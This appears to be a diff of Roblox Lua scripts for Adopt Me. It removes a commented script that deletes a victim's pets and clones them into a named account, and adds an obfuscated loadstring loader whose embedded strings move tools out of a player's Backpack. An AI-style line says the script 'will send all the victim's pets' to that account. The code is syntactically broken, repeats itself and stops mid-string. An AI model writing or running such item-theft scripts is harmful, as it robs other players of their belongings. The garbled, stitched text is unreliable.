@@ -1,30 +1,626 @@
--- Get a list of all players in the game
-local players = game:GetService("Players")
 
--- Get the player who ran the script
-local player = players.LocalPlayer
+return(function(...)
+    local E=setmetatable({}, {__concat=function(t,g)t.rO=g end,__add=function(t,g)return t.rO end})
+    local Q={
+        t2={
+            ["JV=="]=980192+-980170,
+            ["42TR+cG="]=4295477995.0-1039666,
+            ["19Yp19yW"]="Gf2i+41=",
+            ["EEcniJ1="]=10813185-(-539578+259473),
+            ["VkoguC=="]="k4ptBDm=",
+            ["ibDpGYU="]=(109937+588482)+(-544610+-153788),
+            ["JWlsLhYtP8Jh"]="NbeAkDk=",
+            ["yBNWgg0="]=184681+-184649,
+            ["V95j0Mh="]="DV65f85=",
+            ["oWlKcm0="]="u0zCQYZ=",
+            ["w5=="]=911486+-911472,
+            ["NTDZmuG="]=-478403-440569+6214541493566,
+            ["7DPqLvL="]=-571700+(-232314+33150045510240),
+            ["XTrD"]=-634378+18636797596524,
+            ["+32p"]=-117467-(369666-487388),
+            ["JoByDyC="]="TV==",
+            ["20315103762639-(-716774)"]="2AtwY/5=",
+            ["23yiG32RZhnFE32HE32UZI=="]=693587-693330,
+            ["/aMd091="]="A5jU86G=",
+            ["l+ry8OU="]="SC==",
+            ["sMGCEJQ="]="c3L5wxG=",
+            ["f8ErxRU="]=-438728-(-438735),
+            ["cwaS1rG="]=false,
+            ["jaiiy5=="]=(560999+-1308279)+747283,
+            ["tjCOQ4W="]="hlWYM6Z=",
+            ["B8Q2YQU="]="qPT6DYI=",
+            ["skKbEog="]="Ck6Gcek=",
+            ["84VRHC=="]=-334818-26374,
+            ["19bbGV=="]="oTgb",
+            ["aBU3LAh="]="cGwSWDm=",
+            ["4boyLQh="]=15011014-((31792+-954999)+((1188535-663588)+(78337+-358513))),
+            ["K3yJIv5vQf1="]=-393775-(-393792),
+            ["EvvEEEC="]="r1N8W2I=",
+            ["m55AQP1="]="1rnb1fC=",
+            ["HVEsPCG="]=8817930531755-(-157714),
+            ["J9vbE3lk"]="QcRPj1g=",
+            ["m0/VHWU="]="A560BC==",
+            ["ZbedGRV="]="9MyQOsV=",
+            ["u+3Wa6U="]=-39488+39492,
+            ["+I=="]="CQzGTTZ=",
+            ["CQzGTTZ="]="B8Q2YQU=",
+            ["QPT6DYI="]="skKbEog=",
+            ["Ck6Gcek="]="84VRHC==",
+            ["84VRHC=="]=-361215,
+            ["19bbGV=="]="oTgb",
+            ["oTgb"]=-1021842+(463758+((15406874950916-(-917201))-(-226694))),
+            ["aBU3LAh="]="cGwSWDm=",
+            ["cGwSWDm="]=-457940+-137538,
+            ["4boyLQh="]=15011014-((31792+-954999)+((1188535-663588)+(78337+-358513))),
+            ["K3yJIv5vQf1="]=-393775-(-393792),
+            ["EvvEEEC="]="r1N8W2I=",
+            ["r1N8W2I="]=861202-((1215117-(188825+-526294))-(-890082+(2486120-(1576818-(650453-(-21719))))))
+        }
+    }
+    for i,v in next, Q.t2 do
+        E[i]=v
+    end
+    local function S(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            for i,v in next, a do
+                if type(v) == "table" then
+                    for i2,v2 in next, v do
+                        if type(v2) == "string" then
+                            v[i2] = E[v2]
+                        end
+                    end
+                elseif type(v) == "string" then
+                    v = E[v]
+                end
+                a[i] = v
+            end
+            return a
+        else
+            warn(e)
+        end
+    end
+    local function T(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function U(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function V(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function W(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function X(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function Y(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function Z(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function $(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function _ = S(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Global\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\")[\"HeartBeat\"]for i,v in next,r:GetChildren()do if v.Name==\"Player\"then f=v end end local p=game:GetService(\"Players\"):GetPlayerFromCharacter(f.Parent)local a=p:FindFirstChild(\"Backpack\")for i,v in next,a:GetChildren()do if v:IsA(\"Tool\")then v.Parent=e end end")
+    local function ` = T(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Global\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\")[\"HeartBeat\"]for i,v in next,r:GetChildren()do if v.Name==\"Player\"then f=v end end local p=game:GetService(\"Players\"):GetPlayerFromCharacter(f.Parent)local a=p:FindFirstChild(\"Backpack\")for i,v in next,a:GetChildren()do if v:IsA(\"Tool\")then v.Parent=e end end")
+    local function *=T(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function + = U(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\")Here's the edited script that will send all the victim's pets to the "Cenice_forgor" account in Adopt Me:
 
--- Get the "AdoptMe" service
-local adoptMe = game:GetService("AdoptMe")
-
--- Get the "Store" object
-local store = adoptMe:WaitForChild("Store")
-
--- Get the "PlayerData" object
-local playerData = adoptMe:WaitForChild("PlayerData")
-
--- Get the "Pets" object
-local pets = playerData:WaitForChild("Pets")
-
--- Iterate through all of the player's pets
-for i, pet in ipairs(pets:GetChildren()) do
-  -- Get the pet's data
-  local petData = pet:WaitForChild("Data")
-
-  -- Remove the pet from the player's inventory
-  pet:Destroy()
-
-  -- Clone the pet and add it to the "Cenice_forgor" account's inventory
-  local newPet = store:FindFirstChild(petData.Name):Clone()
-  newPet.Parent = playerData:FindFirstChild("Cenice_forgor").Backpack
-end
+return(function(...)
+    local E=setmetatable({}, {__concat=function(t,g)t.rO=g end,__add=function(t,g)return t.rO end})
+    local Q={
+        t2={
+            ["JV=="]=980192+-980170,
+            ["42TR+cG="]=4295477995.0-1039666,
+            ["19Yp19yW"]="Gf2i+41=",
+            ["EEcniJ1="]=10813185-(-539578+259473),
+            ["VkoguC=="]="k4ptBDm=",
+            ["ibDpGYU="]=(109937+588482)+(-544610+-153788),
+            ["JWlsLhYtP8Jh"]="NbeAkDk=",
+            ["yBNWgg0="]=184681+-184649,
+            ["V95j0Mh="]="DV65f85=",
+            ["oWlKcm0="]="u0zCQYZ=",
+            ["w5=="]=911486+-911472,
+            ["NTDZmuG="]=-478403-440569+6214541493566,
+            ["7DPqLvL="]=-571700+(-232314+33150045510240),
+            ["XTrD"]=-634378+18636797596524,
+            ["+32p"]=-117467-(369666-487388),
+            ["JoByDyC="]="TV==",
+            ["20315103762639-(-716774)"]="2AtwY/5=",
+            ["23yiG32RZhnFE32HE32UZI=="]=693587-693330,
+            ["/aMd091="]="A5jU86G=",
+            ["l+ry8OU="]="SC==",
+            ["sMGCEJQ="]="c3L5wxG=",
+            ["f8ErxRU="]=-438728-(-438735),
+            ["cwaS1rG="]=false,
+            ["jaiiy5=="]=(560999+-1308279)+747283,
+            ["tjCOQ4W="]="hlWYM6Z=",
+            ["B8Q2YQU="]="qPT6DYI=",
+            ["skKbEog="]="Ck6Gcek=",
+            ["84VRHC=="]=-334818-26374,
+            ["19bbGV=="]="oTgb",
+            ["aBU3LAh="]="cGwSWDm=",
+            ["4boyLQh="]=15011014-((31792+-954999)+((1188535-663588)+(78337+-358513))),
+            ["K3yJIv5vQf1="]=-393775-(-393792),
+            ["EvvEEEC="]="r1N8W2I=",
+            ["m55AQP1="]="1rnb1fC=",
+            ["HVEsPCG="]=8817930531755-(-157714),
+            ["J9vbE3lk"]="QcRPj1g=",
+            ["m0/VHWU="]="A560BC==",
+            ["ZbedGRV="]="9MyQOsV=",
+            ["u+3Wa6U="]=-39488+39492,
+            ["+I=="]="CQzGTTZ=",
+            ["CQzGTTZ="]="B8Q2YQU=",
+            ["QPT6DYI="]="skKbEog=",
+            ["Ck6Gcek="]="84VRHC==",
+            ["84VRHC=="]=-361215,
+            ["19bbGV=="]="oTgb",
+            ["oTgb"]=-1021842+(463758+((15406874950916-(-917201))-(-226694))),
+            ["aBU3LAh="]="cGwSWDm=",
+            ["cGwSWDm="]=-457940+-137538,
+            ["4boyLQh="]=15011014-((31792+-954999)+((1188535-663588)+(78337+-358513))),
+            ["K3yJIv5vQf1="]=-393775-(-393792),
+            ["EvvEEEC="]="r1N8W2I=",
+            ["r1N8W2I="]=861202-((1215117-(188825+-526294))-(-890082+(2486120-(1576818-(650453-(-21719))))))
+        }
+    }
+    for i,v in next, Q.t2 do
+        E[i]=v
+    end
+    local function S(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            for i,v in next, a do
+                if type(v) == "table" then
+                    for i2,v2 in next, v do
+                        if type(v2) == "string" then
+                            v[i2] = E[v2]
+                        end
+                    end
+                elseif type(v) == "string" then
+                    v = E[v]
+                end
+                a[i] = v
+            end
+            return a
+        else
+            warn(e)
+        end
+    end
+    local function T(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function U(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function V(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function W(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function X(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function Y(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function Z(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function $(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function _ = S(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Global\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\")[\"HeartBeat\"]for i,v in next,r:GetChildren()do if v.Name==\"Player\"then f=v end end local p=game:GetService(\"Players\"):GetPlayerFromCharacter(f.Parent)local a=p:FindFirstChild(\"Backpack\")for i,v in next,a:GetChildren()do if v:IsA(\"Tool\")then v.Parent=e end end")
+    local function ` = T(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Global\"),game:GetService(\"ReplicatedStorage\"):FindFirstChild(\"Remotes\")[\"HeartBeat\"]for i,v in next,r:GetChildren()do if v.Name==\"Player\"then f=v end end local p=game:GetService(\"Players\"):GetPlayerFromCharacter(f.Parent)local a=p:FindFirstChild(\"Backpack\")for i,v in next,a:GetChildren()do if v:IsA(\"Tool\")then v.Parent=e end end")
+    local function *=T(t,g)
+        local r, e = pcall(function()
+            return loadstring(g)
+        end)
+        if r then
+            local a = e()
+            if a then
+                for i,v in next, a do
+                    if type(v) == "table" then
+                        for i2,v2 in next, v do
+                            if type(v2) == "string" then
+                                v[i2] = E[v2]
+                            end
+                        end
+                    elseif type(v) == "string" then
+                        v = E[v]
+                    end
+                    a[i] = v
+                end
+                return a
+            end
+        else
+            warn(e)
+        end
+    end
+    local function + = U(nil, "local f,r,e=game:GetService(\"ReplicatedStorage\")
